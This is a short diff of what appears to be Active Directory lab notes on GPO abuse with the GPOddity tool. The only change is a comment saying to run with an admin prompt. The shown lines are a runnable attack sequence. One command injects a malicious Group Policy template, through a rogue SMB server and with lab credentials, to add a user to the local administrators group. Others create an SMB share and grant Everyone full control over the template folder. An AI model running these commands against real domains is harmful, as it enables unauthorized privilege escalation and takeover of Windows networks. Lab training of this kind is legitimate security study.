@@ -48,7 +48,7 @@ Now malicious GPO template can injected through GPOddity - [https://github.com/s
 <strong>cd /mnt/c/AD/Tools/GPOddity
 </strong><strong># Use the GPOddity
 </strong>sudo python3 gpoddity.py --domain dollarcorp.moneycorp.local --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --username studentx --password xyzdsfsddsf --dc-ip 172.16.2.1 --command "net localgroup administrators studentx  /add" --rogue-smbserver-ip 172.16.100.x --rogue-smbserver-share 'std-anything' --smb-mode none 
-# Create a share with the name mentioned above and host the template
+# Create a share with the name mentioned above and host the template. Run with admin cmd
 net share std-anything=C:\AD\Tools\ GPOddity\GPT_out
 # Grant everyone permission to those templates
 icacls "C:\AD\Tools\GPOddity\GPT_out" /grant Everyone:F /T
